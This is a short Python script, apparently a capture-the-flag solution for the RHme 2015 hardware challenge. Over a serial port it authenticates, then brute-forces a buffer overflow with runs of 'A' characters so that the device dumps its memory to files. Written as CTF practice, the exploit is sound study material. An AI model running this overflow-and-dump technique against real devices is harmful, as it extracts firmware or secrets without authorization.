#!/usr/bin/env python

from rhme_utilities import *

#---------------------------------------
#   Implementation
#---------------------------------------

# Change this to configure the script
lengthStart = 20
lengthEnd = 23

# Info and Style
print("")
print("-------------------- RHme 2015 Dumper --------------------")
print("")

# Define Main
def main():
	# Flush serial
	Serial_Flush()
	
	# Reach desired state
	# Authenticate
	sendCommand = "A" + crlf
	serialPort.write(sendCommand.encode())
	temp = serialPort.readline()
	print(temp.decode())
	temp = serialPort.readline()
	temp = serialPort.readline()
	print(temp.decode())

	sendCommand = "R00063B4C" + crlf
	serialPort.write(sendCommand.encode())
	# Flush Serial
	for f in range(0, 2):
		temp = serialPort.readline()
		print(temp.decode())

	# Begin bruteforcing buffer overflow to dump memory
	for loop in range(lengthStart, lengthEnd):
		# Request reading
		sendCommand = "R" + crlf
		serialPort.write(sendCommand.encode())
		temp = serialPort.readline()

		# Perform overflow
		sendCommand = "A"
		for fill in range(1, loop):
			sendCommand += "A"
		sendCommand += crlf
		serialPort.write(sendCommand.encode())
		# Flush Serial
		for f in range(0, 4):
			temp = serialPort.readline()

		# Dump everything
		dump = open(r"dumps/dumped_" + f'{loop}', "wb")
		temp = serialPort.read()
		while temp != b'':
			dump.write(temp)
			temp = serialPort.read()
		print("--- Memory Dumped ---")
		dump.close()

	print("Job's done!")

# Run Main
if __name__ == '__main__':
    main()
